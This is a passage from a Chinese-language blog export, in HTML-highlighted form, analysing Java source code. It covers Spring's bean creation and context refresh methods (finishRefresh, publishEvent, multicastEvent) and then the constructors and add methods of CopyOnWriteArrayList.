&#123;</span><br><span class="line">            <span class="comment">// Not found -&gt; check parent.</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">nameToLookup</span> <span class="operator">=</span> originalBeanName(name);</span><br><span class="line">            <span class="keyword">if</span> (args != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="comment">// Delegation to parent with explicit args.</span></span><br><span class="line">                <span class="keyword">return</span> (T) parentBeanFactory.getBean(nameToLookup, args);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// No args -&gt; delegate to standard getBean method.</span></span><br><span class="line">                <span class="keyword">return</span> parentBeanFactory.getBean(nameToLookup, requiredType);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!typeCheckOnly) &#123;</span><br><span class="line">            markBeanAsCreated(beanName);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">final</span> <span class="type">RootBeanDefinition</span> <span class="variable">mbd</span> <span class="operator">=</span> getMergedLocalBeanDefinition(beanName);</span><br><span class="line">            checkMergedBeanDefinition(mbd, beanName, args);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Guarantee initialization of beans that the current bean depends on.</span></span><br><span class="line">            String[] dependsOn = mbd.getDependsOn();</span><br><span class="line">            <span class="keyword">if</span> (dependsOn != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">for</span> (String dep : dependsOn) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (isDependent(beanName, dep)) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">BeanCreationException</span>(mbd.getResourceDescription(), beanName,</span><br><span class="line">                                                        <span class="string">&quot;Circular depends-on relationship between &#x27;&quot;</span> + beanName + <span class="string">&quot;&#x27; and &#x27;&quot;</span> + dep + <span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    registerDependentBean(dep, beanName);</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        getBean(dep);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">catch</span> (NoSuchBeanDefinitionException ex) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">BeanCreationException</span>(mbd.getResourceDescription(), beanName,</span><br><span class="line">                                                        <span class="string">&quot;&#x27;&quot;</span> + beanName + <span class="string">&quot;&#x27; depends on missing bean &#x27;&quot;</span> + dep + <span class="string">&quot;&#x27;&quot;</span>, ex);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Create bean instance.</span></span><br><span class="line">            <span class="keyword">if</span> (mbd.isSingleton()) &#123;</span><br><span class="line">                sharedInstance = getSingleton(beanName, <span class="keyword">new</span> <span class="title class_">ObjectFactory</span>&lt;Object&gt;() &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">public</span> Object <span class="title function_">getObject</span><span class="params">()</span> <span class="keyword">throws</span> BeansException &#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            <span class="keyword">return</span> createBean(beanName, mbd, args);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">catch</span> (BeansException ex) &#123;</span><br><span class="line">                            <span class="comment">// Explicitly remove instance from singleton cache: It might have been put there</span></span><br><span class="line">                            <span class="comment">// eagerly by the creation process, to allow for circular reference resolution.</span></span><br><span class="line">                            <span class="comment">// Also remove any beans that received a temporary reference to the bean.</span></span><br><span class="line">                            destroySingleton(beanName);</span><br><span class="line">                            <span class="keyword">throw</span> ex;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;);</span><br><span class="line">                bean = getObjectForBeanInstance(sharedInstance, name, beanName, mbd);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (mbd.isPrototype()) &#123;</span><br><span class="line">                <span class="comment">// It&#x27;s a prototype -&gt; create a new instance.</span></span><br><span class="line">                <span class="type">Object</span> <span class="variable">prototypeInstance</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    beforePrototypeCreation(beanName);</span><br><span class="line">                    prototypeInstance = createBean(beanName, mbd, args);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">finally</span> &#123;</span><br><span class="line">                    afterPrototypeCreation(beanName);</span><br><span class="line">                &#125;</span><br><span class="line">                bean = getObjectForBeanInstance(prototypeInstance, name, beanName, mbd);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">scopeName</span> <span class="operator">=</span> mbd.getScope();</span><br><span class="line">                <span class="keyword">final</span> <span class="type">Scope</span> <span class="variable">scope</span> <span class="operator">=</span> <span class="built_in">this</span>.scopes.get(scopeName);</span><br><span class="line">                <span class="keyword">if</span> (scope == <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;No Scope registered for scope name &#x27;&quot;</span> + scopeName + <span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">Object</span> <span class="variable">scopedInstance</span> <span class="operator">=</span> scope.get(beanName, <span class="keyword">new</span> <span class="title class_">ObjectFactory</span>&lt;Object&gt;() &#123;</span><br><span class="line">                        <span class="meta">@Override</span></span><br><span class="line">                        <span class="keyword">public</span> Object <span class="title function_">getObject</span><span class="params">()</span> <span class="keyword">throws</span> BeansException &#123;</span><br><span class="line">                            beforePrototypeCreation(beanName);</span><br><span class="line">                            <span class="keyword">try</span> &#123;</span><br><span class="line">                                <span class="keyword">return</span> createBean(beanName, mbd, args);</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">finally</span> &#123;</span><br><span class="line">                                afterPrototypeCreation(beanName);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;);</span><br><span class="line">                    bean = getObjectForBeanInstance(scopedInstance, name, beanName, mbd);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">catch</span> (IllegalStateException ex) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">BeanCreationException</span>(beanName,</span><br><span class="line">                                                    <span class="string">&quot;Scope &#x27;&quot;</span> + scopeName + <span class="string">&quot;&#x27; is not active for the current thread; consider &quot;</span> +</span><br><span class="line">                                                    <span class="string">&quot;defining a scoped proxy for this bean if you intend to refer to it from a singleton&quot;</span>,</span><br><span class="line">                                                    ex);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (BeansException ex) &#123;</span><br><span class="line">            cleanupAfterBeanCreationFailure(beanName);</span><br><span class="line">            <span class="keyword">throw</span> ex;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check if required type matches the type of the actual bean instance.</span></span><br><span class="line">    <span class="keyword">if</span> (requiredType != <span class="literal">null</span> &amp;&amp; bean != <span class="literal">null</span> &amp;&amp; !requiredType.isInstance(bean)) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> getTypeConverter().convertIfNecessary(bean, requiredType);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (TypeMismatchException ex) &#123;</span><br><span class="line">            <span class="keyword">if</span> (logger.isDebugEnabled()) &#123;</span><br><span class="line">                logger.debug(<span class="string">&quot;Failed to convert bean &#x27;&quot;</span> + name + <span class="string">&quot;&#x27; to required type &#x27;&quot;</span> +</span><br><span class="line">                             ClassUtils.getQualifiedName(requiredType) + <span class="string">&quot;&#x27;&quot;</span>, ex);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">BeanNotOfRequiredTypeException</span>(name, requiredType, bean.getClass());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (T) bean;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="3-12-finishRefresh"><a href="#3-12-finishRefresh" class="headerlink" title="3.12 finishRefresh"></a>3.12 finishRefresh</h2><p>作用：完成spring上下文刷新，主要是发布spring上下文刷新完成事件。</p>
<p>org.springframework.context.support.AbstractApplicationContext#finishRefresh</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">finishRefresh</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// Initialize lifecycle processor for this context.</span></span><br><span class="line">    <span class="comment">// 创建并绑定生命周期处理器LifecycleProcessor到spring应用上下文，同时注册到BeanFactory。详细：代码3.12.1</span></span><br><span class="line">    initLifecycleProcessor();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Propagate refresh to lifecycle processor first.</span></span><br><span class="line">    getLifecycleProcessor().onRefresh();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Publish the final event.</span></span><br><span class="line">    <span class="comment">// 发布spring上下文刷新完成事件，详细：代码3.12.2</span></span><br><span class="line">    publishEvent(<span class="keyword">new</span> <span class="title class_">ContextRefreshedEvent</span>(<span class="built_in">this</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Participate in LiveBeansView MBean, if active.</span></span><br><span class="line">    LiveBeansView.registerApplicationContext(<span class="built_in">this</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="代码3-12-1"><a href="#代码3-12-1" class="headerlink" title="代码3.12.1"></a>代码3.12.1</h3><p>org.springframework.context.support.AbstractApplicationContext#initLifecycleProcessor</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">initLifecycleProcessor</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">ConfigurableListableBeanFactory</span> <span class="variable">beanFactory</span> <span class="operator">=</span> getBeanFactory();</span><br><span class="line">    <span class="keyword">if</span> (beanFactory.containsLocalBean(LIFECYCLE_PROCESSOR_BEAN_NAME)) &#123;</span><br><span class="line">        <span class="built_in">this</span>.lifecycleProcessor =</span><br><span class="line">            beanFactory.getBean(LIFECYCLE_PROCESSOR_BEAN_NAME, LifecycleProcessor.class);</span><br><span class="line">        <span class="keyword">if</span> (logger.isDebugEnabled()) &#123;</span><br><span class="line">            logger.debug(<span class="string">&quot;Using LifecycleProcessor [&quot;</span> + <span class="built_in">this</span>.lifecycleProcessor + <span class="string">&quot;]&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">DefaultLifecycleProcessor</span> <span class="variable">defaultProcessor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultLifecycleProcessor</span>();</span><br><span class="line">        defaultProcessor.setBeanFactory(beanFactory);</span><br><span class="line">        <span class="comment">// 绑定lifecycleProcessor到spring上下文</span></span><br><span class="line">        <span class="built_in">this</span>.lifecycleProcessor = defaultProcessor;</span><br><span class="line">        <span class="comment">// 注册lifecycleProcessor到容器</span></span><br><span class="line">        beanFactory.registerSingleton(LIFECYCLE_PROCESSOR_BEAN_NAME, <span class="built_in">this</span>.lifecycleProcessor);</span><br><span class="line">        <span class="keyword">if</span> (logger.isDebugEnabled()) &#123;</span><br><span class="line">            logger.debug(<span class="string">&quot;Unable to locate LifecycleProcessor with name &#x27;&quot;</span> +</span><br><span class="line">                         LIFECYCLE_PROCESSOR_BEAN_NAME +</span><br><span class="line">                         <span class="string">&quot;&#x27;: using default [&quot;</span> + <span class="built_in">this</span>.lifecycleProcessor + <span class="string">&quot;]&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="代码3-12-2"><a href="#代码3-12-2" class="headerlink" title="代码3.12.2"></a>代码3.12.2</h3><p>org.springframework.context.support.AbstractApplicationContext#publishEvent(org.springframework.context.ApplicationEvent)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">publishEvent</span><span class="params">(ApplicationEvent event)</span> &#123;</span><br><span class="line">    publishEvent(event, <span class="literal">null</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">publishEvent</span><span class="params">(Object event, ResolvableType eventType)</span> &#123;</span><br><span class="line">    Assert.notNull(event, <span class="string">&quot;Event must not be null&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (logger.isTraceEnabled()) &#123;</span><br><span class="line">        logger.trace(<span class="string">&quot;Publishing event in &quot;</span> + getDisplayName() + <span class="string">&quot;: &quot;</span> + event);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Decorate event as an ApplicationEvent if necessary</span></span><br><span class="line">    ApplicationEvent applicationEvent;</span><br><span class="line">    <span class="keyword">if</span> (event <span class="keyword">instanceof</span> ApplicationEvent) &#123;</span><br><span class="line">        applicationEvent = (ApplicationEvent) event;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        applicationEvent = <span class="keyword">new</span> <span class="title class_">PayloadApplicationEvent</span>&lt;Object&gt;(<span class="built_in">this</span>, event);</span><br><span class="line">        <span class="keyword">if</span> (eventType == <span class="literal">null</span>) &#123;</span><br><span class="line">            eventType = ((PayloadApplicationEvent) applicationEvent).getResolvableType();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Multicast right now if possible - or lazily once the multicaster is initialized</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.earlyApplicationEvents != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="built_in">this</span>.earlyApplicationEvents.add(applicationEvent);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 详细：代码3.12.3</span></span><br><span class="line">        getApplicationEventMulticaster().multicastEvent(applicationEvent, eventType);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Publish event via parent context as well...</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.parent != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.parent <span class="keyword">instanceof</span> AbstractApplicationContext) &#123;</span><br><span class="line">            ((AbstractApplicationContext) <span class="built_in">this</span>.parent).publishEvent(event, eventType);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.parent.publishEvent(event);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="代码3-12-3"><a href="#代码3-12-3" class="headerlink" title="代码3.12.3"></a>代码3.12.3</h3><p>org.springframework.context.event.SimpleApplicationEventMulticaster#multicastEvent(org.springframework.context.ApplicationEvent, org.springframework.core.ResolvableType)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">multicastEvent</span><span class="params">(<span class="keyword">final</span> ApplicationEvent event, ResolvableType eventType)</span> &#123;</span><br><span class="line">    <span class="type">ResolvableType</span> <span class="variable">type</span> <span class="operator">=</span> (eventType != <span class="literal">null</span> ? eventType : resolveDefaultEventType(event));</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">final</span> ApplicationListener&lt;?&gt; listener : getApplicationListeners(event, type)) &#123;</span><br><span class="line">        <span class="type">Executor</span> <span class="variable">executor</span> <span class="operator">=</span> getTaskExecutor();</span><br><span class="line">        <span class="keyword">if</span> (executor != <span class="literal">null</span>) &#123;</span><br><span class="line">            executor.execute(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                    invokeListener(listener, event);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            invokeListener(listener, event);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">invokeListener</span><span class="params">(ApplicationListener&lt;?&gt; listener, ApplicationEvent event)</span> &#123;</span><br><span class="line">    <span class="type">ErrorHandler</span> <span class="variable">errorHandler</span> <span class="operator">=</span> getErrorHandler();</span><br><span class="line">    <span class="keyword">if</span> (errorHandler != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            doInvokeListener(listener, event);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (Throwable err) &#123;</span><br><span class="line">            errorHandler.handleError(err);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        doInvokeListener(listener, event);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">doInvokeListener</span><span class="params">(ApplicationListener listener, ApplicationEvent event)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 最终调用listener的onApplicationEvent方法</span></span><br><span class="line">        listener.onApplicationEvent(event);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (ClassCastException ex) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> ex.getMessage();</span><br><span class="line">        <span class="keyword">if</span> (msg == <span class="literal">null</span> || matchesClassCastMessage(msg, event.getClass())) &#123;</span><br><span class="line">            <span class="comment">// Possibly a lambda-defined listener which we could not resolve the generic event type for</span></span><br><span class="line">            <span class="comment">// -&gt; let&#x27;s suppress the exception and just log a debug message.</span></span><br><span class="line">            <span class="type">Log</span> <span class="variable">logger</span> <span class="operator">=</span> LogFactory.getLog(getClass());</span><br><span class="line">            <span class="keyword">if</span> (logger.isDebugEnabled()) &#123;</span><br><span class="line">                logger.debug(<span class="string">&quot;Non-matching event type for listener: &quot;</span> + listener, ex);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> ex;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="3-13-finally中的resetCommonCaches"><a href="#3-13-finally中的resetCommonCaches" class="headerlink" title="3.13 finally中的resetCommonCaches"></a>3.13 finally中的resetCommonCaches</h2><p>作用：重置spring公共缓存数据，因为单例对象实例化后，这些元数据就不需要了。</p>
<p>org.springframework.context.support.AbstractApplicationContext#resetCommonCaches</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">resetCommonCaches</span><span class="params">()</span> &#123;</span><br><span class="line">    ReflectionUtils.clearCache();</span><br><span class="line">    ResolvableType.clearCache();</span><br><span class="line">    CachedIntrospectionResults.clearClassLoader(getClassLoader());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>源码分析</category>
        <category>Spring</category>
      </categories>
      <tags>
        <tag>源码分析</tag>
        <tag>Spring</tag>
      </tags>
  </entry>
  <entry>
    <title>CopyOnWriteArrayList源码分析</title>
    <url>/2024/01/24/$CopyOnWriteArrayList%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h1 id="1-new-CopyOnWriteArrayList"><a href="#1-new-CopyOnWriteArrayList" class="headerlink" title="1. new CopyOnWriteArrayList()"></a>1. new CopyOnWriteArrayList()</h1><p>无参构造：创建长度为0的Object数组，且该数组使用volatile关键字修饰（可见性、不保证原子性、禁止指令重排）。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="keyword">transient</span> <span class="type">ReentrantLock</span> <span class="variable">lock</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReentrantLock</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">/** The array, accessed only via getArray/setArray. */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">transient</span> <span class="keyword">volatile</span> Object[] array;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">CopyOnWriteArrayList</span><span class="params">()</span> &#123;</span><br><span class="line">    setArray(<span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>setArray(Object[] a)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">setArray</span><span class="params">(Object[] a)</span> &#123;</span><br><span class="line">    array = a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="2-new-CopyOnWriteArrayList-Collection-c"><a href="#2-new-CopyOnWriteArrayList-Collection-c" class="headerlink" title="2. new CopyOnWriteArrayList(Collection&lt;? extends E&gt; c)"></a>2. new CopyOnWriteArrayList(Collection&lt;? extends E&gt; c)</h1><p>返回包含指定集合元素的CopyOnWriteArrayList实例。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">CopyOnWriteArrayList</span><span class="params">(Collection&lt;? extends E&gt; c)</span> &#123;</span><br><span class="line">    Object[] elements;</span><br><span class="line">    <span class="comment">// 集合c是CopyOnWriteArrayList类型，直接获取集合元素。</span></span><br><span class="line">    <span class="keyword">if</span> (c.getClass() == CopyOnWriteArrayList.class)</span><br><span class="line">        elements = ((CopyOnWriteArrayList&lt;?&gt;)c).getArray();</span><br><span class="line">    <span class="comment">// 不是CopyOnWriteArrayList类型，先转为数组，若数组不是Object[]类型，复制一份转成Object[]类型。</span></span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        elements = c.toArray();</span><br><span class="line">        <span class="comment">// c.toArray might (incorrectly) not return Object[] (see 6260652)</span></span><br><span class="line">        <span class="keyword">if</span> (elements.getClass() != Object[].class)</span><br><span class="line">            elements = Arrays.copyOf(elements, elements.length, Object[].class);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 把获取到的数组设置到array属性上。</span></span><br><span class="line">    setArray(elements);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>java.util.Arrays#copyOf(U[], int, java.lang.Class&lt;? extends T[]&gt;)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T,U&gt; T[] copyOf(U[] original, <span class="type">int</span> newLength, Class&lt;? <span class="keyword">extends</span> <span class="title class_">T</span>[]&gt; newType) &#123;</span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">    T[] copy = ((Object)newType == (Object)Object[].class)</span><br><span class="line">        ? (T[]) <span class="keyword">new</span> <span class="title class_">Object</span>[newLength]</span><br><span class="line">        : (T[]) Array.newInstance(newType.getComponentType(), newLength);</span><br><span class="line">    <span class="comment">// 数组元素复制</span></span><br><span class="line">    System.arraycopy(original, <span class="number">0</span>, copy, <span class="number">0</span>,</span><br><span class="line">                     Math.min(original.length, newLength));</span><br><span class="line">    <span class="keyword">return</span> copy;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>java.lang.System#arraycopy</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 数组元素复制：把src从下标srcPos开始复制到从下标destPos开始的dest数组中，复制长度为length</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">arraycopy</span><span class="params">(Object src,  <span class="type">int</span>  srcPos,</span></span><br><span class="line"><span class="params">                                        Object dest, <span class="type">int</span> destPos,</span></span><br><span class="line"><span class="params">                                        <span class="type">int</span> length)</span>;</span><br></pre></td></tr></table></figure>

<h1 id="3-new-CopyOnWriteArrayList-E-toCopyIn"><a href="#3-new-CopyOnWriteArrayList-E-toCopyIn" class="headerlink" title="3. new CopyOnWriteArrayList(E[] toCopyIn)"></a>3. new CopyOnWriteArrayList(E[] toCopyIn)</h1><p>返回包含指定数组元素的CopyOnWriteArrayList实例。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">CopyOnWriteArrayList</span><span class="params">(E[] toCopyIn)</span> &#123;</span><br><span class="line">    setArray(Arrays.copyOf(toCopyIn, toCopyIn.length, Object[].class));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="4-add-E-e"><a href="#4-add-E-e" class="headerlink" title="4. add(E e)"></a>4. add(E e)</h1><p>在旧数组基础上创建一份复制，长度为旧数组长度+1，在新数组末尾插入新元素，Object数组变量指向新数组。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">add</span><span class="params">(E e)</span> &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">ReentrantLock</span> <span class="variable">lock</span> <span class="operator">=</span> <span class="built_in">this</span>.lock;</span><br><span class="line">    <span class="comment">// 加锁</span></span><br><span class="line">    lock.lock();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Object[] elements = getArray();</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> elements.length;</span><br><span class="line">        <span class="comment">// 创建新复制，长度为len+1</span></span><br><span class="line">        Object[] newElements = Arrays.copyOf(elements, len + <span class="number">1</span>);</span><br><span class="line">        newElements[len] = e;</span><br><span class="line">        setArray(newElements);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="comment">// 在finally块解锁</span></span><br><span class="line">        lock.unlock();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="5-add-int-index-E-element"><a href="#5-add-int-index-E-element" class="headerlink" title="5. add(int index, E element)"></a>5. add(int index, E element)</h1><p>在指定位置插入元素，新元素在list的下标为index。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> index, E element)</span> &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">ReentrantLock</span> <span class="variable">lock</span> <span class="operator">=</span> <span class="built_in">this</span>.lock;</span><br><span class="line">    <span class="comment">// 加锁</span></span><br><span class="line">    lock.lock();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Object[] elements = getArray();</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> elements.length;</span><br><span class="line">        <span class="comment">// 插入值的下标范围：[0, len]，为len时，与add(E e)一样</span></span><br><span class="line">        <span class="keyword">if</span> (index &gt; len || index &lt; <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IndexOutOfBoundsException</span>(<span class="string">&quot;Index: &quot;</span>+index+</span><br><span class="line">                                                <span class="string">&quot;, Size: &quot;</span>+len);</span><br><span class="line">        Object[] newElements;</span><br><span class="line">        <span class="comment">// 计算需要移动元素的个数（插入位置后的元素）</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">numMoved</span> <span class="operator">=</span> len - index;</span><br><span class="line">        <span class="keyword">if</span> (numMoved == <span class="number">0</span>)</span><br><span class="line">            newElements = Arrays.copyOf(elements, len + <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            newElements = <span class="keyword">new</span> <span class="title class_">Object</span>[len + <span class="number">1</span>];</span><br><span class="line">            <span class="comment">// 从旧数组0下标位置开始复制，复制到新数组中（新数组也是从0位置开始插入），复制长度为index</span></span><br><span class="line">            System.arraycopy(elements, <span class="number">0</span>, newElements, <span class="number">0</span>, index);</span><br><span class="line">            <span class="comment">// 从旧数组index下标位置开始复制，复制到新数组中（新数组从index+1位置开始插入），复制长度为numMoved，还有下标index位置元素为null</span></span><br><span class="line">            System.arraycopy(elements, index, newElements, index + <span class="number">1</span>,</span><br><span class="line">                             numMoved);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 插入新元素到index下标位置</span></span><br><span class="line">        newElements[index] = element;</span><br><span class="line">        <span class="comment">// Object数组变量指向新数组</span></span><br><span class="line">        setArray(newElements);</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span 